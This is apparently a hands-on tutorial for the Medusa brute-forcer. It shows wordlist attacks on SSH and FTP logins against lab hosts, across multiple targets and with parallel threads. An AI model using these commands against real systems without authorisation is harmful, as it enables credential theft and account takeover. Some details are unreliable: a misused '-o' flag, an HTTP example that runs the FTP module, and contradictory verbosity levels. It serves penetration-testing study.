# Medusa For Brute Force Attack

![0_ETI_tTrASL5HsCwv](https://github.com/user-attachments/assets/e4de03bd-f54d-4af8-ad15-fd1d4e826d07)



## What is Medusa?
Medusa is a parallel, modular, and fast network login brute-forcer that supports many protocols. It's known for its speed and efficiency compared to other tools.


## Key Features:
  - Parallelized attacks - Multiple connections simultaneously
  - Modular design - Supports 30+ protocols via modules
  - Flexible input - Various credential combination methods
  - Resume capability - Can continue interrupted sessions
  - Speed optimized - Generally faster than Hydra


## Medusa vs Hydra:
  - Medusa: Faster, more efficient threading, better for high-speed networks
  - Hydra: More protocols, better community support, more flexible options
    


## Installation & Setup

### Linux Installation
````
sudo apt install medusa
````
<img width="699" height="181" alt="image" src="https://github.com/user-attachments/assets/c1454a76-6ae6-4783-ab99-00e1718f1647" />

- But all in linux maybe already installed.


### Compile from Source
````
git clone https://github.com/jmk-foofus/medusa
cd medusa
./configure
make
sudo make install
````
- In this i don't show demo cause it already have in my kali.



### Verification

#### Check installation
````
medusa -h
````
<img width="887" height="687" alt="image" src="https://github.com/user-attachments/assets/c7dc82d8-cf3a-40f8-ac2d-af95c23bae59" />





---



# Medusa Methodology




## Basic Syntax & Structure

### Core Command Format
````
medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-M module] [options]
````


### Options usage

| Option |               Arg? | Meaning / Description                                                                            |
| ------ | -----------------: | ------------------------------------------------------------------------------------------------ |
| `-h`   |                yes | Target hostname or IP address (single).                                                          |
| `-H`   |         yes (file) | File containing target hostnames or IP addresses.                                                |
| `-u`   |                yes | Username to test (single).                                                                       |
| `-U`   |         yes (file) | File containing usernames to test.                                                               |
| `-p`   |                yes | Password to test (single).                                                                       |
| `-P`   |         yes (file) | File containing passwords to test.                                                               |
| `-C`   |         yes (file) | File containing combo entries (username:password lines). See README.                             |
| `-O`   |         yes (file) | File to append log information to.                                                               |
| `-e`   | yes (`n`/`s`/`ns`) | Extra password checks: `n` = no password, `s` = password = username, `ns` = both.                |
| `-M`   |                yes | Name of the module to execute (without `.mod` extension). **Required**.                          |
| `-m`   |   yes (repeatable) | Parameter to pass to the module (can be used multiple times).                                    |
| `-d`   |                 no | Dump (list) all known modules.                                                                   |
| `-n`   |          yes (num) | Non-default TCP port number.                                                                     |
| `-s`   |                 no | Enable SSL/TLS for the connection.                                                               |
| `-g`   |          yes (num) | Give up after trying to connect for NUM seconds (default 3).                                     |
| `-r`   |          yes (num) | Sleep NUM seconds between retry attempts (default 3).                                            |
| `-R`   |          yes (num) | Attempt NUM retries before giving up (total attempts = NUM + 1).                                 |
| `-c`   |          yes (num) | Wait time in µs to verify socket is available (default 500 µs).                                  |
| `-t`   |          yes (num) | Total number of logins to be tested concurrently (threads).                                      |
| `-T`   |          yes (num) | Total number of hosts to be tested concurrently.                                                 |
| `-L`   |                 no | Parallelize logins using one username per thread. Default processes full username list per user. |
| `-f`   |                 no | Stop scanning a host after the first valid username/password is found for that host.             |
| `-F`   |                 no | Stop the whole audit after the first valid username/password is found on any host.               |
| `-b`   |                 no | Suppress startup banner.                                                                         |
| `-q`   |                 no | Display module's usage information (module-specific help).                                       |
| `-v`   |      yes (num 0–6) | Verbose level (0–6; higher = more verbose).                                                      |
| `-w`   |     yes (num 0–10) | Error debug level (0–10; higher = more debug).                                                   |
| `-V`   |                 no | Display version.                                                                                 |
| `-Z`   |         yes (text) | Resume scan based on map of previous scan (restore state).                                       |


---




## Medusa Protocol Modules

### View Available Modules
````
medusa -d
````
<img width="979" height="537" alt="image" src="https://github.com/user-attachments/assets/6d02440b-3fa2-487e-a672-45735cacfabd" />



### Module-Specific Syntax

#### Check module options
````
medusa -M http -q
````
<img width="731" height="358" alt="image" src="https://github.com/user-attachments/assets/486b762d-dfb5-44cc-986a-50ad8e332fdc" />

---



## Basic Attacks

### Service Discovery
````
nmap -sV -T4 192.168.127.129
````
<img width="1038" height="582" alt="image" src="https://github.com/user-attachments/assets/652e185a-f0a6-4353-89a6-f3c51847856e" />


### Prepare Wordlists
<img width="1162" height="128" alt="image" src="https://github.com/user-attachments/assets/2df72d49-190c-47cc-8ba8-7f317ad4e640" />

- In this we can use with `rockyou.txt`.




### Basic SSH Attack

#### SSH Attack specific username:
````
medusa -h 192.168.127.129 -u msfadmin -P /usr/share/wordlists/passwd.txt -M ssh -v 6
````
<img width="1618" height="461" alt="image" src="https://github.com/user-attachments/assets/ed3d0896-08be-4042-85d0-204729c4bce6" />




#### SSH with username and passowrd wordlists:
````
medusa -h 192.168.127.129 -U /usr/share/wordlists/user.txt -P /usr/share/wordlists/passwd.txt -M ssh -v 6
````
<img width="1642" height="460" alt="image" src="https://github.com/user-attachments/assets/d5f90212-6fbc-4a7a-95d6-e9eae8147bad" />


#### SSH with custom port:
````
medusa -h 192.168.127.129 -u msfadmin -P /usr/share/wordlists/passwd.txt -M ssh -n 22 -v 6
````
<img width="1633" height="451" alt="image" src="https://github.com/user-attachments/assets/14b85e24-1bda-4eeb-aefa-b68f8d84ba00" />


#### Output Management
````
medusa -h 192.168.127.129 -u msfadmin -P /usr/share/wordlists/passwd.txt -M ssh -n 22 -v 6 -o results.txt
````
<img width="1691" height="365" alt="image" src="https://github.com/user-attachments/assets/fc9d0d3f-8ae1-46ee-8296-07a1b63b73c2" />

````
cat results.txt
````
<img width="1102" height="136" alt="image" src="https://github.com/user-attachments/assets/9315111f-05a8-4f2b-9fa0-7d8fa0e346d5" />

---


### FTP Attack

#### Basic FTP attack
````
medusa -h 192.168.127.129 -u msfadmin -P /usr/share/wordlists/passwd.txt -M ftp -v 6
````
<img width="1618" height="457" alt="image" src="https://github.com/user-attachments/assets/b2d6d3db-f0cf-47e1-8739-367780bb5a5e" />



#### Specify path for HTTP basic auth
````
medusa -h 192.168.127.129 -u msfadmin -P /usr/share/wordlists/passwd.txt -M ftp DIR:/admin -v 6
````
<img width="1623" height="465" alt="image" src="https://github.com/user-attachments/assets/a57407b0-f6e2-4ba9-8934-64bba8542b1b" />


#### Stop on Success
While using the above command, the atack will go on though we get the correct username and password, this may become tedious when the list of usernames and password is long. 
So, to save from this medusa provides some options. 
````
medusa -H host.txt -U /usr/share/wordlists/user.txt -P /usr/share/wordlists/passwd.txt -M ftp -v 6 -f
````
<img width="1653" height="743" alt="image" src="https://github.com/user-attachments/assets/b8c61f20-2398-42bc-97f3-2562add1cbff" />

<img width="1653" height="650" alt="image" src="https://github.com/user-attachments/assets/43fed00b-9392-4cf2-9eff-2281bd66b3d2" />


````
medusa -H host.txt -U /usr/share/wordlists/user.txt -P /usr/share/wordlists/passwd.txt -M ftp -v 6 -F
````
<img width="1658" height="351" alt="image" src="https://github.com/user-attachments/assets/14488d00-b613-4d5f-bee4-07b99fff43c9" />

- And in the second command, -F opioon is used that will stop audit after first valid username/password found on any host. 
- Above in the first command as you can observe -f option is used so that will stop scanning host after first valid username/password found.




---






## Advanced Medusa Techniques

### Parallel Processing
````
medusa -h 192.168.127.129 -U /usr/share/wordlists/user.txt -P /usr/share/wordlists/passwd.txt -M ssh -T 16 -t 4 -v 6 -f
````
<img width="1660" height="350" alt="image" src="https://github.com/user-attachments/assets/c16b503a-e904-48b8-83c4-d5ac9fb3a925" />





### Brute Force on Multiple Host 
- In this i test withtwo target:
<img width="845" height="447" alt="image" src="https://github.com/user-attachments/assets/9f5b3f72-801c-4932-b8c7-f601357dfca0" />

<img width="803" height="457" alt="image" src="https://github.com/user-attachments/assets/4a3f7c42-41f4-4a68-a6c4-b1791e6f91fd" />

````
nmap -sV -T4 192.168.127.129,136
````
<img width="891" height="752" alt="image" src="https://github.com/user-attachments/assets/93ff53b4-afcd-4e47-8dfd-32c615ae2ca2" />

- Also in this i test with `SSH`:

- First create host:
````
sudo mousepad host.txt
````
````
192.168.127.129
192.168.127.136
````
<img width="646" height="308" alt="image" src="https://github.com/user-attachments/assets/e3f3e864-0d9c-4b45-b681-3ff093a7bab3" />


````
medusa -H host.txt -U /usr/share/wordlists/user.txt -P /usr/share/wordlists/passwd.txt -M ssh -v 6 -f
````
<img width="1175" height="718" alt="image" src="https://github.com/user-attachments/assets/387320f3-94bf-4797-a03c-2d3f1061d67f" />

- In this we found both of them `Username` and `Password`.



**Important note**: If we want to brute force i suggests use this **-v 6** and **-f**.


---



## Comprehensive SSH Audit

### SSH security assessment
````
medusa -h 192.168.127.129 -U /usr/share/wordlists/user.txt -P /usr/share/wordlists/passwd.txt -M ssh -T 16 -t 2 -w 5 -n 22 -f -O ssh_audit.txt -v 6
````
<img width="1665" height="375" alt="image" src="https://github.com/user-attachments/assets/ce11bb82-f71b-42b4-833d-b9b0f477aa0e" />



---


## To suppress start-up Banner

Whenever you run medusa, always a start up banner is displayed. But this tool provides an option to remove the banner by using -b option. 

````
medusa -h 192.168.127.129 -u msfadmin -P /usr/share/wordlists/passwd.txt -M ftp -b
````
<img width="1662" height="217" alt="image" src="https://github.com/user-attachments/assets/90d78354-06e0-4f41-9890-51099fd8c415" />




## Verbose Mode 
This tool provides an op�on for verbose mode. There are in all six verbose level. All messages at or below the specified level will be displayed. The default level is 5. The following is the breakdown of the verbose levels: 
0.EXIT APPLICATION 
1.MESSAGE WITHOUT TAG 
2.LOG MESSAGE WITHOUT TAG                
3.IMPORTANT MESSAGE 
4.ACCOUNT FOUND 
5.ACCOUNT CHECK 
6.GENERAL MESSAGE

### Medusa verbose:

|       `-v` level | What you see (summary)                                                                                                                                                 | Typical use                                                 |
| ---------------: | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------- |
| `-v 0` (default) | Minimal output: only final results and errors.                                                                                                                         | Quick runs when you only want successes.                    |
|           `-v 1` | Basic progress lines: host/task start/finish and summary of found credentials.                                                                                         | General monitoring of job progress.                         |
|           `-v 2` | Per-attempt notifications: each login attempt shown (username/password tried) and simple status (connect/fail/success).                                                | Debugging incorrect user/pass combos or wordlist coverage.  |
|           `-v 3` | More detailed per-attempt responses: shows response codes/messages returned by the target (e.g., auth failed, connection refused).                                     | Diagnose why attempts fail (auth vs connection issues).     |
|           `-v 4` | Protocol-level details: partial request/response snippets, headers (for HTTP modules), and timing info for each attempt.                                               | Deep debugging of HTTP/LDAP/other protocol interactions.    |
|           `-v 5` | Extended debug: internal state, retries, per-socket status, and more verbose timing/tracing.                                                                           | When investigating intermittent or flaky issues.            |
|           `-v 6` | Maximum verbosity: complete low-level debug and dump info (almost everything Medusa knows about the run), including socket connect details and internal decision logs. | Only for deep developer-level troubleshooting — very noisy. |



````
medusa -h 192.168.127.129 -u msfadmin -P /usr/share/wordlists/passwd.txt -M ftp -v 6
````
<img width="1677" height="353" alt="image" src="https://github.com/user-attachments/assets/4f7433dc-d7af-4dd5-90e8-198b1a561e46" />



---


## Error Debug level 
This option is used to give detailed description of error. There are 10 error debug level. All messages at or below the specified level will be displayed. The default level is 5.

The following is the breakdown of the error levels: 

0: FATAL 
1: ALERT 
2: CRITICAL                                        
3: ERROR                              
4: WARNING                                      
5: NOTICE 
6: INFO                                                 
7: DEBUG                                             
8: DEBUG-AUDIT                              
9: DEBUG- SERVER 
10: DEBUG – MODULE 


````
medusa -h 192.168.127.129 -u msfadmin -P /usr/share/wordlists/passwd.txt -M ftp -w 0
````
<img width="1686" height="266" alt="image" src="https://github.com/user-attachments/assets/dad3e96b-d5e9-4df9-a138-de67a4833d7f" />


````
medusa -h 192.168.127.129 -u msfadmin -P /usr/share/wordlists/passwd.txt -M ftp -w 6
````
<img width="1677" height="497" alt="image" src="https://github.com/user-attachments/assets/aba0facd-7e67-40d3-a460-d6b28e483a52" />


````
medusa -h 192.168.127.129 -u msfadmin -P /usr/share/wordlists/passwd.txt -M ftp -w 7
````
<img width="1580" height="775" alt="image" src="https://github.com/user-attachments/assets/477d4260-4871-4db1-a112-d3e0a0eed548" />

<img width="1597" height="757" alt="image" src="https://github.com/user-attachments/assets/c9bc5e3c-c035-4c7a-8af4-47027dd88acb" />


---



## Display Module Usage Information 
You can use a new option -q which will display module's usage information. This should be used in conjunction with the `-M` option. 

````
medusa -h 192.168.127.129 -u msfadmin -P /usr/share/wordlists/passwd.txt -M ftp -q
````
<img width="929" height="673" alt="image" src="https://github.com/user-attachments/assets/35f76dc5-b24d-427b-8b4c-2c66091faa00" />


----


---

## End Of Medusa For Brute Force Attack


---




---

## Credit: Nin Kanong (k4n0ng)

---

